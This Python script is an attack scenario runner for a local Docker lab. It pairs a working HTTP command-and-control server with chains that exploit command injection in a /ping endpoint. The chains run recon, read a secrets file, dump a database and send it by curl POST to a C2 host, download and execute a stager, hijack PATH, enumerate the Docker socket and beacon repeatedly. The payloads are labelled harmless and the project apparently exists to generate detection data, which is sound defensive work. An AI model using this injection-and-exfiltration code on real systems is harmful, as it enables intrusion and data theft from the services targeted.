#!/usr/bin/env python3
"""EBLIT Attack Scenario Runner v1.
Supports two modes:
  c2      - Start a local HTTP C2 server for lab experiments.
  attack  - Execute attack chains via vuln-app /ping command injection.

Examples:
  # Start C2 server
  python3 scripts/run_attack_scenario_v1.py c2 --host 0.0.0.0 --port 4444 --upload-dir /app/data/c2

  # Run single scenario
  python3 scripts/run_attack_scenario_v1.py attack --scenario apt_data_theft \\
      --base-url http://127.0.0.1:5000 --out data/attack_corpus_v1/apt_data_theft/run_001

  # Run docker-sock scenario
  python3 scripts/run_attack_scenario_v1.py attack --scenario apt_docker_sock \\
      --base-url http://127.0.0.1:5000 --dsock-url http://127.0.0.1:5001 \\
      --out data/attack_corpus_v1/apt_docker_sock/run_001

  # Run all scenarios
  python3 scripts/run_attack_scenario_v1.py attack --scenario all \\
      --base-url http://127.0.0.1:5000 --dsock-url http://127.0.0.1:5001 \\
      --out data/attack_corpus_v1/all/run_001
"""

from __future__ import annotations

import argparse
import http.server
import json
import os
import random
import sys
import time
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any


C2_HOST_DEFAULT = "0.0.0.0"
C2_PORT_DEFAULT = 4444
C2_UPLOAD_DIR_DEFAULT = "/app/data/c2"

STAGER_SCRIPT = "#!/bin/sh\necho 'eblit_stager_executed' > /tmp/eblit_marker.txt\n"

class C2Handler(http.server.BaseHTTPRequestHandler):
    upload_dir: str = C2_UPLOAD_DIR_DEFAULT

    def do_GET(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == "/payloads/stager.sh":
            self._send(200, STAGER_SCRIPT.encode(), "text/x-shellscript")
        elif parsed.path == "/beacon":
            qs = urllib.parse.parse_qs(parsed.query)
            bid = qs.get("id", ["unknown"])[0]
            print(f"[c2] beacon id={bid}", flush=True)
            self._send(200, b"ok", "text/plain")
        else:
            self._send(404, b"not found", "text/plain")

    def do_POST(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path.startswith("/upload"):
            qs = urllib.parse.parse_qs(parsed.query)
            name = qs.get("name", ["unnamed"])[0]
            length = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(length) if length > 0 else b""
            out_path = Path(self.upload_dir) / name
            out_path.parent.mkdir(parents=True, exist_ok=True)
            out_path.write_bytes(data)
            print(f"[c2] upload name={name} size={len(data)}", flush=True)
            self._send(200, b"ok", "text/plain")
        else:
            self._send(404, b"not found", "text/plain")

    def log_message(self, fmt: str, *args: Any) -> None:
        print(f"[c2] {fmt % args}", flush=True)

    def _send(self, code: int, body: bytes, ctype: str) -> None:
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.end_headers()
        self.wfile.write(body)


def run_c2(host: str, port: int, upload_dir: str) -> None:
    C2Handler.upload_dir = upload_dir
    Path(upload_dir).mkdir(parents=True, exist_ok=True)
    server = http.server.HTTPServer((host, port), C2Handler)
    print(f"[c2] listening on {host}:{port}, upload-dir={upload_dir}", flush=True)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("[c2] shutting down", flush=True)
        server.shutdown()


def run_injection(base_url: str, command: str, timeout: float = 30.0) -> dict[str, Any]:
    params = urllib.parse.urlencode({"ip": f"127.0.0.1;{command}"})
    url = f"{base_url}/ping?{params}"
    start_ts = datetime.now(timezone.utc).isoformat()
    status_code = 0
    error = ""
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            status_code = resp.status
    except Exception as e:
        error = str(e)
        try:
            status_code = getattr(e, "code", 0)
        except Exception:
            pass
    end_ts = datetime.now(timezone.utc).isoformat()
    return {
        "start_ts": start_ts,
        "end_ts": end_ts,
        "target_url": url,
        "status_code": status_code,
        "error": error,
    }


def make_step(
    scenario: str,
    step_id: int,
    step_name: str,
    target: str,
    target_url: str,
    command_summary: str,
    expected_process: list[str],
    expected_files: list[str],
    expected_network: list[str],
    mitre_tactic: str,
    description: str,
    start_ts: str,
    end_ts: str,
    error: str = "",
) -> dict[str, Any]:
    return {
        "scenario": scenario,
        "step_id": step_id,
        "step_name": step_name,
        "start_ts": start_ts,
        "end_ts": end_ts,
        "target": target,
        "target_url": target_url,
        "command_summary": command_summary,
        "expected_process": expected_process,
        "expected_files": expected_files,
        "expected_network": expected_network,
        "mitre_tactic": mitre_tactic,
        "description": description,
        "safe_lab_only": True,
        **({"error": error} if error else {}),
    }


SCENARIOS = ["apt_data_theft", "apt_dropper_hijack", "apt_docker_sock", "apt_long_beacon", "all"]


def apt_data_theft(
    base_url: str,
    dsock_url: str,
    rng: random.Random,
    out_dir: Path,
) -> list[dict[str, Any]]:
    steps: list[dict[str, Any]] = []
    target = "vuln-app"
    c2_addr = "c2-listener:4444"

    # Step 1: recon_probe
    rng_sleep(rng)
    cmd = "whoami; id; uname -a; pwd; ls /app/data; env | head -5"
    s = run_injection(base_url, cmd)
    steps.append(make_step(
        scenario="apt_data_theft", step_id=1, step_name="recon_probe",
        target=target, target_url=s["target_url"],
        command_summary="basic recon: whoami/id/uname/pwd/ls/env",
        expected_process=["sh", "whoami", "id", "uname", "ls", "env"],
        expected_files=["/app/data"],
        expected_network=[],
        mitre_tactic="discovery",
        description="Reconnaissance: enumerate identity, OS, working directory, data layout, and environment variables.",
        start_ts=s["start_ts"], end_ts=s["end_ts"], error=s.get("error", ""),
    ))

    # Step 2: secret_read
    rng_sleep(rng)
    cmd = "cat /app/data/secrets/demo.env"
    s = run_injection(base_url, cmd)
    steps.append(make_step(
        scenario="apt_data_theft", step_id=2, step_name="secret_read",
        target=target, target_url=s["target_url"],
        command_summary="read dummy secret file /app/data/secrets/demo.env",
        expected_process=["sh", "cat"],
        expected_files=["/app/data/secrets/demo.env"],
        expected_network=[],
        mitre_tactic="collection",
        description="Read lab-only dummy secret file containing fake credentials. No real system credentials are accessed.",
        start_ts=s["start_ts"], end_ts=s["end_ts"], error=s.get("error", ""),
    ))

    # Step 3: db_dump_local
    rng_sleep(rng)
    cmd = "sqlite3 /app/data/app.db .dump > /tmp/db_dump.sql"
    s = run_injection(base_url, cmd)
    steps.append(make_step(
        scenario="apt_data_theft", step_id=3, step_name="db_dump_local",
        target=target, target_url=s["target_url"],
        command_summary="sqlite3 dump of /app/data/app.db to /tmp/db_dump.sql",
        expected_process=["sh", "sqlite3"],
        expected_files=["/app/data/app.db", "/tmp/db_dump.sql"],
        expected_network=[],
        mitre_tactic="collection",
        description="Export the lab SQLite database to a local temp file using sqlite3 .dump. No real data is harmed.",
        start_ts=s["start_ts"], end_ts=s["end_ts"], error=s.get("error", ""),
    ))

    # Step 4: db_exfil_c2
    rng_sleep(rng)
    cmd = "tar czf /tmp/exfil_pack.tgz /tmp/db_dump.sql /app/data/secrets/demo.env && curl -sS -X POST --data-binary @/tmp/exfil_pack.tgz http://c2-listener:4444/upload?name=exfil_pack.tgz"
    s = run_injection(base_url, cmd)
    steps.append(make_step(
        scenario="apt_data_theft", step_id=4, step_name="db_exfil_c2",
        target=target, target_url=s["target_url"],
        command_summary="pack db_dump.sql + demo.env into tgz, POST to internal C2",
        expected_process=["sh", "tar", "curl"],
        expected_files=["/tmp/exfil_pack.tgz", "/tmp/db_dump.sql", "/app/data/secrets/demo.env"],
        expected_network=[c2_addr],
        mitre_tactic="exfiltration",
        description="Package the database dump and dummy secret into a tarball and exfiltrate to the internal C2 listener. C2 is compose-internal only.",
        start_ts=s["start_ts"], end_ts=s["end_ts"], error=s.get("error", ""),
    ))

    return steps


def apt_dropper_hijack(
    base_url: str,
    dsock_url: str,
    rng: random.Random,
    out_dir: Path,
) -> list[dict[str, Any]]:
    steps: list[dict[str, Any]] = []
    target = "vuln-app"
    c2_addr = "c2-listener:4444"

    # Step 1: recon_probe
    rng_sleep(rng)
    cmd = "echo $PATH; ls -la /tmp; ls /app/data"
    s = run_injection(base_url, cmd)
    steps.append(make_step(
        scenario="apt_dropper_hijack", step_id=1, step_name="recon_probe",
        target=target, target_url=s["target_url"],
        command_summary="check PATH, /tmp, /app/data layout",
        expected_process=["sh", "ls"],
        expected_files=["/tmp", "/app/data"],
        expected_network=[],
        mitre_tactic="discovery",
        description="Reconnaissance: inspect PATH, writable directories, and data layout.",
        start_ts=s["start_ts"], end_ts=s["end_ts"], error=s.get("error", ""),
    ))

    # Step 2: drop_and_exec
    rng_sleep(rng)
    cmd = "curl -sS http://c2-listener:4444/payloads/stager.sh -o /tmp/stager.sh && chmod +x /tmp/stager.sh && sh /tmp/stager.sh"
    s = run_injection(base_url, cmd)
    steps.append(make_step(
        scenario="apt_dropper_hijack", step_id=2, step_name="drop_and_exec",
        target=target, target_url=s["target_url"],
        command_summary="download stager.sh from C2, chmod, execute (writes marker file only)",
        expected_process=["sh", "curl", "chmod"],
        expected_files=["/tmp/stager.sh", "/tmp/eblit_marker.txt"],
        expected_network=[c2_addr],
        mitre_tactic="execution",
        description="Download a harmless stager script from the internal C2, make it executable, and run it. The stager only writes a marker file /tmp/eblit_marker.txt. No persistence, no privilege escalation.",
        start_ts=s["start_ts"], end_ts=s["end_ts"], error=s.get("error", ""),
    ))

    # Step 3: path_hijack_exec
    rng_sleep(rng)
    cmd = "mkdir -p /tmp/evilbin && printf '#!/bin/sh\\necho PATH_HIJACK > /tmp/path_hijack_marker.txt\\n' > /tmp/evilbin/ping && chmod +x /tmp/evilbin/ping && PATH=/tmp/evilbin:$PATH ping -c 1 127.0.0.1"
    s = run_injection(base_url, cmd)
    steps.append(make_step(
        scenario="apt_dropper_hijack", step_id=3, step_name="path_hijack_exec",
        target=target, target_url=s["target_url"],
        command_summary="create /tmp/evilbin/ping hijack script, prepend to PATH, invoke ping",
        expected_process=["sh", "chmod", "ping"],
        expected_files=["/tmp/evilbin/ping", "/tmp/path_hijack_marker.txt"],
        expected_network=[],
        mitre_tactic="defense-evasion",
        description="Place a benign substitute script at /tmp/evilbin/ping that writes a marker file, prepend /tmp/evilbin to PATH, then invoke ping. Demonstrates PATH hijack without real harm.",
        start_ts=s["start_ts"], end_ts=s["end_ts"], error=s.get("error", ""),
    ))

    # Step 4: resource_abuse
    rng_sleep(rng)
    cmd = "python -c \"import time; t=time.time()+12; x=0\\nwhile time.time()<t:\\n x=(x*1664525+1013904223)&0xFFFFFFFF\\nprint('eblit_cpu_burn_done')\""
    s = run_injection(base_url, cmd, timeout=30.0)
    steps.append(make_step(
        scenario="apt_dropper_hijack", step_id=4, step_name="resource_abuse",
        target=target, target_url=s["target_url"],
        command_summary="12-second CPU-intensive loop (PRNG crunch, no fork bomb)",
        expected_process=["sh", "python"],
        expected_files=[],
        expected_network=[],
        mitre_tactic="impact",
        description="Run a time-bounded (12s) CPU-intensive PRNG loop to simulate resource abuse / crypto-mining. No fork bomb, no infinite loop, no persistent damage.",
        start_ts=s["start_ts"], end_ts=s["end_ts"], error=s.get("error", ""),
    ))

    return steps


def apt_docker_sock(
    base_url: str,
    dsock_url: str,
    rng: random.Random,
    out_dir: Path,
) -> list[dict[str, Any]]:
    steps: list[dict[str, Any]] = []
    target = "vuln-app-dsock"
    c2_addr = "c2-listener:4444"
    effective_url = dsock_url or base_url

    # Step 1: recon_probe
    rng_sleep(rng)
    cmd = "ls -la /var/run/docker.sock"
    s = run_injection(effective_url, cmd)
    steps.append(make_step(
        scenario="apt_docker_sock", step_id=1, step_name="recon_probe",
        target=target, target_url=s["target_url"],
        command_summary="check if /var/run/docker.sock exists",
        expected_process=["sh", "ls"],
        expected_files=["/var/run/docker.sock"],
        expected_network=[],
        mitre_tactic="discovery",
        description="Check whether the Docker socket is mounted inside the container. Read-only check, no API calls yet.",
        start_ts=s["start_ts"], end_ts=s["end_ts"], error=s.get("error", ""),
    ))

    # Step 2: docker_sock_version
    rng_sleep(rng)
    cmd = "python -c \"import socket; s=socket.socket(socket.AF_UNIX); s.connect('/var/run/docker.sock'); s.sendall(b'GET /version HTTP/1.0\\\\r\\\\nHost: docker\\\\r\\\\n\\\\r\\\\n'); print(s.recv(4096).decode('utf-8','ignore')); s.close()\""
    s = run_injection(effective_url, cmd)
    steps.append(make_step(
        scenario="apt_docker_sock", step_id=2, step_name="docker_sock_version",
        target=target, target_url=s["target_url"],
        command_summary="read-only Docker API GET /version via Unix socket",
        expected_process=["sh", "python"],
        expected_files=["/var/run/docker.sock"],
        expected_network=[],
        mitre_tactic="discovery",
        description="Query Docker API GET /version through the mounted Unix socket. Read-only request, no container creation or modification.",
        start_ts=s["start_ts"], end_ts=s["end_ts"], error=s.get("error", ""),
    ))

    # Step 3: docker_sock_container_enum
    rng_sleep(rng)
    cmd = "python -c \"import socket,json; s=socket.socket(socket.AF_UNIX); s.connect('/var/run/docker.sock'); s.sendall(b'GET /containers/json HTTP/1.0\\\\r\\\\nHost: docker\\\\r\\\\n\\\\r\\\\n'); data=s.recv(65536).decode('utf-8','ignore'); s.close(); body=data.split('\\\\r\\\\n\\\\r\\\\n',1)[-1]; open('/tmp/docker_containers.json','w').write(body); print('saved')\""
    s = run_injection(effective_url, cmd)
    steps.append(make_step(
        scenario="apt_docker_sock", step_id=3, step_name="docker_sock_container_enum",
        target=target, target_url=s["target_url"],
        command_summary="read-only Docker API GET /containers/json, save result locally",
        expected_process=["sh", "python"],
        expected_files=["/var/run/docker.sock", "/tmp/docker_containers.json"],
        expected_network=[],
        mitre_tactic="discovery",
        description="Enumerate running containers via Docker API GET /containers/json through the Unix socket. Save the JSON response locally. Strictly read-only: no container creation, start, exec, or mount.",
        start_ts=s["start_ts"], end_ts=s["end_ts"], error=s.get("error", ""),
    ))

    # Step 4: light_exfil
    rng_sleep(rng)
    cmd = "curl -sS -X POST --data-binary @/tmp/docker_containers.json http://c2-listener:4444/upload?name=docker_containers.json"
    s = run_injection(effective_url, cmd)
    steps.append(make_step(
        scenario="apt_docker_sock", step_id=4, step_name="light_exfil",
        target=target, target_url=s["target_url"],
        command_summary="exfiltrate docker_containers.json to internal C2",
        expected_process=["sh", "curl"],
        expected_files=["/tmp/docker_containers.json"],
        expected_network=[c2_addr],
        mitre_tactic="exfiltration",
        description="Send the container enumeration result to the internal C2 listener. C2 is compose-internal only, no external network access.",
        start_ts=s["start_ts"], end_ts=s["end_ts"], error=s.get("error", ""),
    ))

    return steps


def apt_long_beacon(
    base_url: str,
    dsock_url: str,
    rng: random.Random,
    out_dir: Path,
) -> list[dict[str, Any]]:
    steps: list[dict[str, Any]] = []
    target = "vuln-app"
    c2_addr = "c2-listener:4444"

    beacon_interval_min = 15
    beacon_interval_max = 30
    beacon_duration_seconds = 180
    step_id = 1

    # Step 1: recon_probe
    rng_sleep(rng)
    cmd = "hostname; whoami; pwd; date"
    s = run_injection(base_url, cmd)
    steps.append(make_step(
        scenario="apt_long_beacon", step_id=step_id, step_name="recon_probe",
        target=target, target_url=s["target_url"],
        command_summary="lightweight recon: hostname/whoami/pwd/date",
        expected_process=["sh", "hostname", "whoami", "date"],
        expected_files=[],
        expected_network=[],
        mitre_tactic="discovery",
        description="Minimal reconnaissance to gather host context before starting beacon loop.",
        start_ts=s["start_ts"], end_ts=s["end_ts"], error=s.get("error", ""),
    ))
    step_id += 1

    # Step 2: long_lived_beacon (multi-round)
    beacon_start = time.monotonic()
    round_id = 0
    while time.monotonic() - beacon_start < beacon_duration_seconds:
        round_id += 1
        interval = rng.randint(beacon_interval_min, beacon_interval_max)
        time.sleep(interval)
        cmd = f"curl -sS 'http://c2-listener:4444/beacon?id=eblit_r{round_id}'"
        s = run_injection(base_url, cmd)
        steps.append(make_step(
            scenario="apt_long_beacon", step_id=step_id, step_name="long_lived_beacon",
            target=target, target_url=s["target_url"],
            command_summary=f"beacon round {round_id} to internal C2",
            expected_process=["sh", "curl"],
            expected_files=[],
            expected_network=[c2_addr],
            mitre_tactic="command-and-control",
            description=f"Beacon round {round_id}: send lightweight check-in to internal C2. Interval ~{interval}s. Used to validate cross-window low-frequency anomaly detection.",
            start_ts=s["start_ts"], end_ts=s["end_ts"], error=s.get("error", ""),
        ))
        step_id += 1

    # Step 3: light_exfil
    rng_sleep(rng)
    cmd = "curl -sS -X POST -d 'hostname=$(hostname)&user=$(whoami)&ts=$(date -Iseconds)&rounds=" + str(round_id) + "' http://c2-listener:4444/upload?name=beacon_summary.txt"
    s = run_injection(base_url, cmd)
    steps.append(make_step(
        scenario="apt_long_beacon", step_id=step_id, step_name="light_exfil",
        target=target, target_url=s["target_url"],
        command_summary="exfiltrate beacon summary (hostname, user, timestamp, round count) to C2",
        expected_process=["sh", "curl"],
        expected_files=[],
        expected_network=[c2_addr],
        mitre_tactic="exfiltration",
        description="Send a small beacon summary to the internal C2. Contains only hostname, user, timestamp, and round count. No real secrets.",
        start_ts=s["start_ts"], end_ts=s["end_ts"], error=s.get("error", ""),
    ))

    return steps


SCENARIO_FUNCS = {
    "apt_data_theft": apt_data_theft,
    "apt_dropper_hijack": apt_dropper_hijack,
    "apt_docker_sock": apt_docker_sock,
    "apt_long_beacon": apt_long_beacon,
}


def rng_sleep(rng: random.Random, min_s: float = 1.0, max_s: float = 3.0) -> None:
    time.sleep(rng.uniform(min_s, max_s))


def run_attack(args: argparse.Namespace) -> int:
    scenario = args.scenario
    base_url = args.base_url
    dsock_url = args.dsock_url
    out_dir = Path(args.out)
    seed = args.seed
    sleep_min = args.sleep_min
    sleep_max = args.sleep_max

    rng = random.Random(seed)
    out_dir.mkdir(parents=True, exist_ok=True)

    scenarios_to_run: list[str]
    if scenario == "all":
        scenarios_to_run = list(SCENARIO_FUNCS.keys())
    else:
        scenarios_to_run = [scenario]

    all_steps: list[dict[str, Any]] = []
    scenario_metas: list[dict[str, Any]] = []

    for sc_name in scenarios_to_run:
        func = SCENARIO_FUNCS.get(sc_name)
        if func is None:
            print(f"[attack] unknown scenario: {sc_name}", file=sys.stderr)
            continue
        print(f"[attack] running scenario: {sc_name}")
        sc_start = datetime.now(timezone.utc).isoformat()
        try:
            steps = func(base_url, dsock_url, rng, out_dir)
        except Exception as e:
            print(f"[attack] scenario {sc_name} failed: {e}", file=sys.stderr)
            steps = []
        sc_end = datetime.now(timezone.utc).isoformat()
        all_steps.extend(steps)
        scenario_metas.append({
            "scenario": sc_name,
            "start_ts": sc_start,
            "end_ts": sc_end,
            "step_count": len(steps),
            "seed": seed,
            "base_url": base_url,
            "dsock_url": dsock_url,
        })

    steps_path = out_dir / "attack_steps.jsonl"
    with open(steps_path, "w", encoding="utf-8") as f:
        for step in all_steps:
            f.write(json.dumps(step, ensure_ascii=False) + "\n")

    meta_path = out_dir / "scenario_meta.json"
    with open(meta_path, "w", encoding="utf-8") as f:
        json.dump({
            "run_ts": datetime.now(timezone.utc).isoformat(),
            "scenarios": scenario_metas,
            "total_steps": len(all_steps),
            "seed": seed,
            "base_url": base_url,
            "dsock_url": dsock_url,
            "safe_lab_only": True,
        }, f, ensure_ascii=False, indent=2)

    print(f"[attack] done: {len(all_steps)} steps written to {steps_path}")
    print(f"[attack] meta written to {meta_path}")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(
        description="EBLIT Attack Scenario Runner v1 - local Docker lab only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    sub = parser.add_subparsers(dest="mode", required=True)

    # c2 mode
    p_c2 = sub.add_parser("c2", help="Start local HTTP C2 server")
    p_c2.add_argument("--host", default=C2_HOST_DEFAULT)
    p_c2.add_argument("--port", type=int, default=C2_PORT_DEFAULT)
    p_c2.add_argument("--upload-dir", default=C2_UPLOAD_DIR_DEFAULT)

    # attack mode
    p_atk = sub.add_parser("attack", help="Execute attack chains via /ping injection")
    p_atk.add_argument("--scenario", choices=SCENARIOS, required=True,
                        help="Attack scenario to run (or 'all')")
    p_atk.add_argument("--base-url", default="http://127.0.0.1:5000",
                        help="Base URL of vuln-app (default: http://127.0.0.1:5000)")
    p_atk.add_argument("--dsock-url", default="http://127.0.0.1:5001",
                        help="Base URL of vuln-app-dsock (default: http://127.0.0.1:5001)")
    p_atk.add_argument("--out", required=True, help="Output directory for attack_steps.jsonl and scenario_meta.json")
    p_atk.add_argument("--sleep-min", type=float, default=1.0, help="Min sleep between steps (default: 1)")
    p_atk.add_argument("--sleep-max", type=float, default=3.0, help="Max sleep between steps (default: 3)")
    p_atk.add_argument("--seed", type=int, default=2026, help="Random seed for reproducibility (default: 2026)")

    args = parser.parse_args()

    if args.mode == "c2":
        return 0 if run_c2(args.host, args.port, args.upload_dir) is None else 0
    elif args.mode == "attack":
        return run_attack(args)
    return 1


if __name__ == "__main__":
    sys.exit(main())
